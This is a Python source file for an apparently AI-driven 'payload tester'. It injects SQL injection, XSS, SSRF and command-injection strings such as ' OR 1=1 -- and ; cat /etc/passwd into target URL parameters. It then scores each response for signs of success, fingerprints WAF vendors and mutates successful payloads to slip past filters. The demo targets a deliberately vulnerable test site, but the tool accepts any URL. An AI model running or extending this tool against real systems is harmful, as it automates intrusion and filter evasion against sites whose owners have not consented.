#!/usr/bin/env python3
"""
Agent DS v2.0 - AI Payload Testing & Validation
================================================

Automated testing and validation system for AI-generated payloads with
real-time effectiveness scoring, success pattern recognition, and 
adaptive improvement mechanisms.

Features:
- Automated payload effectiveness testing
- Real-time success rate tracking
- Pattern recognition for payload optimization
- A/B testing for payload variants
- Historical performance analysis
- Adaptive learning from test results

Author: Agent DS Development Team
Version: 2.0.0
Date: September 2025
"""

import asyncio
import aiohttp
import time
import json
import hashlib
import statistics
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
import logging
from datetime import datetime, timedelta

@dataclass
class TestResult:
    """Payload test result structure"""
    payload_id: str
    payload: str
    target_url: str
    test_type: str
    success: bool
    response_time: float
    status_code: int
    response_length: int
    response_headers: Dict[str, str]
    response_body_sample: str
    success_indicators_found: List[str]
    failure_indicators_found: List[str]
    waf_detected: bool
    error_messages: List[str]
    test_timestamp: float
    confidence_score: float

@dataclass
class PayloadPerformanceMetrics:
    """Performance metrics for payload tracking"""
    payload: str
    total_tests: int
    successful_tests: int
    success_rate: float
    average_response_time: float
    waf_bypass_rate: float
    effectiveness_score: float
    last_tested: float
    test_contexts: List[str]
    improvement_trend: float

class TestType(Enum):
    """Test type enumeration"""
    BLIND = "blind"
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    TIME_BASED = "time_based"
    BOOLEAN_BASED = "boolean_based"
    RESPONSE_ANALYSIS = "response_analysis"
    WAF_BYPASS = "waf_bypass"

class AIPayloadTester:
    """Advanced AI payload testing and validation system"""
    
    def __init__(self):
        self.session = None
        self.test_results = []
        self.payload_metrics = {}
        self.testing_stats = {
            'total_tests': 0,
            'successful_tests': 0,
            'average_test_time': 0.0,
            'waf_encounters': 0,
            'unique_payloads_tested': 0
        }
        
        # Success and failure indicators
        self.success_indicators = {
            'sql_injection': [
                'mysql', 'syntax error', 'ora-', 'microsoft', 'postgresql',
                'sqlite_version', 'version()', 'user()', 'database()',
                'information_schema', 'dual', 'pg_', 'sys.', 'master..'
            ],
            'xss': [
                'alert', 'confirm', 'prompt', 'document.cookie', 'script',
                'javascript:', 'onerror', 'onload', 'onclick', 'svg'
            ],
            'ssrf': [
                'metadata', 'instance', 'security-credentials', 'localhost',
                'internal', '127.0.0.1', '::1', 'file://', 'gopher://'
            ],
            'command_injection': [
                'uid=', 'gid=', 'passwd', 'root:', 'win.ini', 'system32',
                '/etc/', 'c:\\windows', 'command not found', 'whoami'
            ],
            'ssti': [
                '49', '7777777', 'template', 'jinja', 'twig', 'smarty',
                'velocity', 'freemarker', 'calculation', 'expression'
            ]
        }
        
        self.failure_indicators = [
            'blocked', 'filtered', 'waf', 'firewall', 'security',
            'invalid input', 'malicious', 'attack detected', 'forbidden',
            'access denied', 'not allowed', 'suspicious activity'
        ]
        
        self.waf_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'aws_waf': ['x-amzn-requestid', 'x-amz-cf-id'],
            'imperva': ['visid_incap', 'incap_ses'],
            'akamai': ['akamai', 'x-akamai'],
            'sucuri': ['x-sucuri-id', 'sucuri'],
            'barracuda': ['barra', 'x-barracuda'],
            'f5': ['f5-bigip', 'x-f5'],
            'generic': ['x-waf', 'security', 'protection']
        }
        
        print("[INFO] AI Payload Tester initialized")
    
    async def initialize_session(self):
        """Initialize HTTP session with proper configuration"""
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        connector = aiohttp.TCPConnector(
            limit=10,
            limit_per_host=5,
            ttl_dns_cache=300,
            use_dns_cache=True
        )
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
        )
    
    async def close_session(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()
    
    async def test_payload_effectiveness(self, payload: str, target_url: str,
                                       test_type: TestType = TestType.RESPONSE_ANALYSIS,
                                       attack_vector: str = "sql_injection") -> TestResult:
        """Test payload effectiveness against target"""
        if not self.session:
            await self.initialize_session()
        
        start_time = time.time()
        
        try:
            # Prepare test request
            test_url = self._prepare_test_url(target_url, payload, test_type)
            
            # Execute test
            async with self.session.get(test_url, allow_redirects=True, ssl=False) as response:
                response_time = time.time() - start_time
                
                # Read response
                response_body = await response.text()
                response_headers = dict(response.headers)
                
                # Analyze response
                analysis = self._analyze_response(
                    response_body, response_headers, response.status, attack_vector
                )
                
                # Create test result
                test_result = TestResult(
                    payload_id=hashlib.md5(payload.encode()).hexdigest()[:8],
                    payload=payload,
                    target_url=target_url,
                    test_type=test_type.value,
                    success=analysis['success'],
                    response_time=response_time,
                    status_code=response.status,
                    response_length=len(response_body),
                    response_headers=response_headers,
                    response_body_sample=response_body[:500],
                    success_indicators_found=analysis['success_indicators'],
                    failure_indicators_found=analysis['failure_indicators'],
                    waf_detected=analysis['waf_detected'],
                    error_messages=analysis['error_messages'],
                    test_timestamp=time.time(),
                    confidence_score=analysis['confidence_score']
                )
                
                # Update statistics
                self._update_statistics(test_result)
                
                return test_result
                
        except Exception as e:
            # Handle test failure
            response_time = time.time() - start_time
            
            return TestResult(
                payload_id=hashlib.md5(payload.encode()).hexdigest()[:8],
                payload=payload,
                target_url=target_url,
                test_type=test_type.value,
                success=False,
                response_time=response_time,
                status_code=0,
                response_length=0,
                response_headers={},
                response_body_sample="",
                success_indicators_found=[],
                failure_indicators_found=[],
                waf_detected=False,
                error_messages=[str(e)],
                test_timestamp=time.time(),
                confidence_score=0.0
            )
    
    def _prepare_test_url(self, base_url: str, payload: str, test_type: TestType) -> str:
        """Prepare test URL with payload"""
        if '?' in base_url:
            separator = '&'
        else:
            separator = '?'
        
        # Choose parameter name based on test type
        param_names = {
            TestType.BLIND: 'id',
            TestType.ERROR_BASED: 'search',
            TestType.UNION_BASED: 'category',
            TestType.TIME_BASED: 'order',
            TestType.BOOLEAN_BASED: 'filter',
            TestType.RESPONSE_ANALYSIS: 'q',
            TestType.WAF_BYPASS: 'input'
        }
        
        param_name = param_names.get(test_type, 'test')
        return f"{base_url}{separator}{param_name}={payload}"
    
    def _analyze_response(self, response_body: str, response_headers: Dict[str, str],
                         status_code: int, attack_vector: str) -> Dict[str, Any]:
        """Analyze response for success/failure indicators"""
        analysis = {
            'success': False,
            'success_indicators': [],
            'failure_indicators': [],
            'waf_detected': False,
            'error_messages': [],
            'confidence_score': 0.0
        }
        
        response_lower = response_body.lower()
        
        # Check for success indicators
        success_indicators = self.success_indicators.get(attack_vector, [])
        for indicator in success_indicators:
            if indicator.lower() in response_lower:
                analysis['success_indicators'].append(indicator)
        
        # Check for failure indicators
        for indicator in self.failure_indicators:
            if indicator.lower() in response_lower:
                analysis['failure_indicators'].append(indicator)
        
        # Check for WAF detection
        waf_detected = self._detect_waf(response_headers, response_body)
        if waf_detected:
            analysis['waf_detected'] = True
            analysis['failure_indicators'].append(f"WAF: {waf_detected}")
        
        # Extract error messages
        error_patterns = [
            r'error.*?:.*?(?=<|$)',
            r'exception.*?:.*?(?=<|$)',
            r'warning.*?:.*?(?=<|$)',
            r'mysql.*?error.*?:.*?(?=<|$)',
            r'ora-\d+.*?:.*?(?=<|$)'
        ]
        
        import re
        for pattern in error_patterns:
            matches = re.findall(pattern, response_body, re.IGNORECASE | re.DOTALL)
            analysis['error_messages'].extend(matches[:3])  # Limit to 3 matches
        
        # Determine success
        if analysis['success_indicators'] and not analysis['failure_indicators']:
            analysis['success'] = True
            analysis['confidence_score'] = min(0.9, len(analysis['success_indicators']) * 0.3)
        elif analysis['success_indicators'] and analysis['failure_indicators']:
            # Mixed signals - lower confidence
            if len(analysis['success_indicators']) > len(analysis['failure_indicators']):
                analysis['success'] = True
                analysis['confidence_score'] = 0.6
            else:
                analysis['confidence_score'] = 0.3
        else:
            analysis['confidence_score'] = 0.1
        
        # Adjust confidence based on status code
        if status_code in [500, 502, 503]:
            analysis['confidence_score'] += 0.2  # Server errors might indicate success
        elif status_code in [403, 406, 418]:
            analysis['confidence_score'] -= 0.3  # Likely blocked
        
        analysis['confidence_score'] = max(0.0, min(1.0, analysis['confidence_score']))
        
        return analysis
    
    def _detect_waf(self, headers: Dict[str, str], response_body: str) -> Optional[str]:
        """Detect WAF presence from headers and response"""
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        response_lower = response_body.lower()
        
        # Check header signatures
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                for header_name, header_value in headers_lower.items():
                    if signature in header_name or signature in header_value:
                        return waf_name
        
        # Check response body signatures
        waf_response_patterns = [
            ('cloudflare', ['cloudflare', 'cf-ray', 'attention required']),
            ('aws_waf', ['aws waf', 'forbidden by aws']),
            ('imperva', ['imperva', 'incapsula']),
            ('akamai', ['akamai', 'reference #']),
            ('sucuri', ['sucuri', 'access denied']),
            ('generic', ['web application firewall', 'request blocked', 'security filter'])
        ]
        
        for waf_name, patterns in waf_response_patterns:
            for pattern in patterns:
                if pattern in response_lower:
                    return waf_name
        
        return None
    
    def _update_statistics(self, test_result: TestResult):
        """Update testing statistics"""
        self.test_results.append(test_result)
        self.testing_stats['total_tests'] += 1
        
        if test_result.success:
            self.testing_stats['successful_tests'] += 1
        
        if test_result.waf_detected:
            self.testing_stats['waf_encounters'] += 1
        
        # Update average test time
        total_time = sum(r.response_time for r in self.test_results)
        self.testing_stats['average_test_time'] = total_time / len(self.test_results)
        
        # Update payload metrics
        self._update_payload_metrics(test_result)
    
    def _update_payload_metrics(self, test_result: TestResult):
        """Update metrics for specific payload"""
        payload = test_result.payload
        
        if payload not in self.payload_metrics:
            self.payload_metrics[payload] = PayloadPerformanceMetrics(
                payload=payload,
                total_tests=0,
                successful_tests=0,
                success_rate=0.0,
                average_response_time=0.0,
                waf_bypass_rate=0.0,
                effectiveness_score=0.0,
                last_tested=0.0,
                test_contexts=[],
                improvement_trend=0.0
            )
        
        metrics = self.payload_metrics[payload]
        metrics.total_tests += 1
        
        if test_result.success:
            metrics.successful_tests += 1
        
        # Update success rate
        metrics.success_rate = metrics.successful_tests / metrics.total_tests
        
        # Update average response time
        all_times = [r.response_time for r in self.test_results if r.payload == payload]
        metrics.average_response_time = statistics.mean(all_times)
        
        # Update WAF bypass rate
        waf_tests = [r for r in self.test_results if r.payload == payload and r.waf_detected]
        waf_bypasses = [r for r in waf_tests if r.success]
        if waf_tests:
            metrics.waf_bypass_rate = len(waf_bypasses) / len(waf_tests)
        
        # Calculate effectiveness score
        metrics.effectiveness_score = (
            metrics.success_rate * 0.5 +
            metrics.waf_bypass_rate * 0.3 +
            (1 - min(metrics.average_response_time / 10, 1)) * 0.2
        )
        
        metrics.last_tested = test_result.test_timestamp
        
        # Update test contexts
        context = f"{test_result.test_type}_{test_result.target_url}"
        if context not in metrics.test_contexts:
            metrics.test_contexts.append(context)
        
        # Calculate improvement trend (last 10 tests)
        recent_tests = [r for r in self.test_results if r.payload == payload][-10:]
        if len(recent_tests) >= 5:
            first_half = recent_tests[:len(recent_tests)//2]
            second_half = recent_tests[len(recent_tests)//2:]
            
            first_success_rate = sum(1 for r in first_half if r.success) / len(first_half)
            second_success_rate = sum(1 for r in second_half if r.success) / len(second_half)
            
            metrics.improvement_trend = second_success_rate - first_success_rate
    
    async def batch_test_payloads(self, payloads: List[str], target_urls: List[str],
                                attack_vector: str = "sql_injection") -> List[TestResult]:
        """Test multiple payloads against multiple targets"""
        results = []
        
        for payload in payloads:
            for target_url in target_urls:
                try:
                    result = await self.test_payload_effectiveness(
                        payload, target_url, TestType.RESPONSE_ANALYSIS, attack_vector
                    )
                    results.append(result)
                    
                    # Small delay to avoid overwhelming targets
                    await asyncio.sleep(0.5)
                    
                except Exception as e:
                    print(f"[ERROR] Batch test failed for {payload}: {e}")
        
        return results
    
    async def adaptive_payload_testing(self, initial_payloads: List[str], 
                                     target_url: str, attack_vector: str = "sql_injection",
                                     max_iterations: int = 5) -> Dict[str, Any]:
        """Adaptive testing that learns and improves payloads"""
        iteration_results = []
        current_payloads = initial_payloads.copy()
        
        for iteration in range(max_iterations):
            print(f"[INFO] Adaptive testing iteration {iteration + 1}/{max_iterations}")
            
            # Test current payload set
            iteration_tests = []
            for payload in current_payloads:
                result = await self.test_payload_effectiveness(
                    payload, target_url, TestType.RESPONSE_ANALYSIS, attack_vector
                )
                iteration_tests.append(result)
                await asyncio.sleep(0.3)
            
            iteration_results.append({
                'iteration': iteration + 1,
                'tests': iteration_tests,
                'success_rate': sum(1 for r in iteration_tests if r.success) / len(iteration_tests),
                'average_confidence': statistics.mean(r.confidence_score for r in iteration_tests)
            })
            
            # Analyze results and adapt
            successful_payloads = [r.payload for r in iteration_tests if r.success]
            failed_payloads = [r.payload for r in iteration_tests if not r.success]
            
            # Generate new payloads based on successful ones
            if successful_payloads and iteration < max_iterations - 1:
                new_payloads = self._generate_adaptive_variants(
                    successful_payloads, failed_payloads, attack_vector
                )
                current_payloads = successful_payloads + new_payloads[:5]
            
            print(f"[INFO] Iteration {iteration + 1}: {len(successful_payloads)} successful payloads")
        
        return {
            'iterations': iteration_results,
            'final_successful_payloads': [r.payload for r in iteration_results[-1]['tests'] if r.success],
            'improvement_trend': [r['success_rate'] for r in iteration_results],
            'best_payloads': self.get_top_performing_payloads(attack_vector, limit=5)
        }
    
    def _generate_adaptive_variants(self, successful_payloads: List[str],
                                  failed_payloads: List[str], attack_vector: str) -> List[str]:
        """Generate adaptive payload variants based on test results"""
        variants = []
        
        for payload in successful_payloads:
            # Create simple mutations
            mutations = [
                payload.replace("'", '"'),  # Quote variation
                payload.replace(" ", "/**/"),  # Comment insertion
                payload.upper(),  # Case variation
                payload.replace("=", " LIKE "),  # Operator variation
                f"({payload})",  # Parentheses wrapping
            ]
            
            variants.extend(mutations)
        
        # Remove duplicates and failed payloads
        variants = list(set(variants))
        variants = [v for v in variants if v not in failed_payloads]
        
        return variants[:10]  # Limit variants
    
    def get_top_performing_payloads(self, attack_vector: str = None, 
                                  limit: int = 10) -> List[PayloadPerformanceMetrics]:
        """Get top performing payloads based on effectiveness score"""
        payloads = list(self.payload_metrics.values())
        
        # Filter by attack vector if specified
        if attack_vector:
            # This would require tracking attack vector in metrics
            pass
        
        # Sort by effectiveness score
        payloads.sort(key=lambda x: x.effectiveness_score, reverse=True)
        
        return payloads[:limit]
    
    def get_testing_report(self) -> Dict[str, Any]:
        """Generate comprehensive testing report"""
        if not self.test_results:
            return {'error': 'No test results available'}
        
        # Overall statistics
        total_tests = len(self.test_results)
        successful_tests = sum(1 for r in self.test_results if r.success)
        success_rate = successful_tests / total_tests
        
        # WAF statistics
        waf_encounters = sum(1 for r in self.test_results if r.waf_detected)
        waf_bypasses = sum(1 for r in self.test_results if r.waf_detected and r.success)
        
        # Response time statistics
        response_times = [r.response_time for r in self.test_results]
        
        # Attack vector breakdown
        attack_vectors = {}
        for result in self.test_results:
            # Would need to track attack vector in test results
            pass
        
        # Top performing payloads
        top_payloads = self.get_top_performing_payloads(limit=5)
        
        return {
            'test_summary': {
                'total_tests': total_tests,
                'successful_tests': successful_tests,
                'success_rate': success_rate,
                'unique_payloads': len(self.payload_metrics),
                'test_period': {
                    'start': min(r.test_timestamp for r in self.test_results),
                    'end': max(r.test_timestamp for r in self.test_results)
                }
            },
            'waf_analysis': {
                'encounters': waf_encounters,
                'bypasses': waf_bypasses,
                'bypass_rate': waf_bypasses / waf_encounters if waf_encounters > 0 else 0
            },
            'performance_metrics': {
                'average_response_time': statistics.mean(response_times),
                'median_response_time': statistics.median(response_times),
                'fastest_response': min(response_times),
                'slowest_response': max(response_times)
            },
            'top_payloads': [
                {
                    'payload': p.payload[:100] + '...' if len(p.payload) > 100 else p.payload,
                    'success_rate': p.success_rate,
                    'total_tests': p.total_tests,
                    'effectiveness_score': p.effectiveness_score,
                    'waf_bypass_rate': p.waf_bypass_rate
                }
                for p in top_payloads
            ],
            'trends': {
                'recent_success_rate': self._calculate_recent_success_rate(),
                'improvement_indicators': self._analyze_improvement_trends()
            }
        }
    
    def _calculate_recent_success_rate(self, hours: int = 24) -> float:
        """Calculate success rate for recent tests"""
        cutoff_time = time.time() - (hours * 3600)
        recent_tests = [r for r in self.test_results if r.test_timestamp >= cutoff_time]
        
        if not recent_tests:
            return 0.0
        
        return sum(1 for r in recent_tests if r.success) / len(recent_tests)
    
    def _analyze_improvement_trends(self) -> Dict[str, Any]:
        """Analyze improvement trends in testing"""
        if len(self.test_results) < 10:
            return {'insufficient_data': True}
        
        # Split results into halves
        midpoint = len(self.test_results) // 2
        first_half = self.test_results[:midpoint]
        second_half = self.test_results[midpoint:]
        
        first_success_rate = sum(1 for r in first_half if r.success) / len(first_half)
        second_success_rate = sum(1 for r in second_half if r.success) / len(second_half)
        
        return {
            'success_rate_trend': second_success_rate - first_success_rate,
            'is_improving': second_success_rate > first_success_rate,
            'confidence_trend': statistics.mean(r.confidence_score for r in second_half) - 
                              statistics.mean(r.confidence_score for r in first_half)
        }
    
    async def export_test_data(self, format: str = "json") -> str:
        """Export test data in specified format"""
        if format == "json":
            export_data = {
                'metadata': {
                    'export_timestamp': time.time(),
                    'total_tests': len(self.test_results),
                    'total_payloads': len(self.payload_metrics)
                },
                'test_results': [asdict(result) for result in self.test_results],
                'payload_metrics': [asdict(metrics) for metrics in self.payload_metrics.values()],
                'statistics': self.testing_stats
            }
            return json.dumps(export_data, indent=2)
        
        return "Unsupported format"

# Example usage and testing
async def main():
    """Example usage of AI Payload Tester"""
    print("=== Agent DS v2.0 - AI Payload Tester Demo ===")
    
    # Initialize tester
    tester = AIPayloadTester()
    
    # Test payloads
    test_payloads = [
        "' OR 1=1 --",
        "' UNION SELECT user(),version() --",
        "<script>alert('XSS')</script>",
        "http://127.0.0.1/",
        "; cat /etc/passwd"
    ]
    
    # Test URLs (use safe/legal targets only)
    test_urls = [
        "http://demo.testfire.net/bank/queryxpath.aspx",
        "http://demo.testfire.net/search.aspx"
    ]
    
    print(f"Testing {len(test_payloads)} payloads against {len(test_urls)} targets")
    
    try:
        # Batch testing
        results = await tester.batch_test_payloads(test_payloads, test_urls, "sql_injection")
        
        print(f"\n=== BATCH TEST RESULTS ===")
        for result in results:
            print(f"Payload: {result.payload[:50]}...")
            print(f"Success: {result.success} (Confidence: {result.confidence_score:.2f})")
            print(f"Response Time: {result.response_time:.3f}s")
            print(f"WAF Detected: {result.waf_detected}")
            if result.success_indicators_found:
                print(f"Success Indicators: {result.success_indicators_found}")
            print()
        
        # Adaptive testing
        print("\n=== ADAPTIVE TESTING ===")
        adaptive_results = await tester.adaptive_payload_testing(
            test_payloads[:3], test_urls[0], "sql_injection", max_iterations=3
        )
        
        print(f"Adaptive testing completed:")
        for i, iteration in enumerate(adaptive_results['iterations'], 1):
            print(f"  Iteration {i}: {iteration['success_rate']:.2%} success rate")
        
        print(f"Final successful payloads: {len(adaptive_results['final_successful_payloads'])}")
        
        # Generate report
        report = tester.get_testing_report()
        print(f"\n=== TESTING REPORT ===")
        print(f"Total Tests: {report['test_summary']['total_tests']}")
        print(f"Success Rate: {report['test_summary']['success_rate']:.2%}")
        print(f"Average Response Time: {report['performance_metrics']['average_response_time']:.3f}s")
        
        if report['waf_analysis']['encounters'] > 0:
            print(f"WAF Encounters: {report['waf_analysis']['encounters']}")
            print(f"WAF Bypass Rate: {report['waf_analysis']['bypass_rate']:.2%}")
        
        # Show top payloads
        if report['top_payloads']:
            print(f"\nTop Performing Payloads:")
            for i, payload in enumerate(report['top_payloads'], 1):
                print(f"  {i}. Success Rate: {payload['success_rate']:.2%}")
                print(f"     Effectiveness: {payload['effectiveness_score']:.3f}")
                print(f"     Payload: {payload['payload']}")
        
    finally:
        await tester.close_session()

if __name__ == "__main__":
    asyncio.run(main())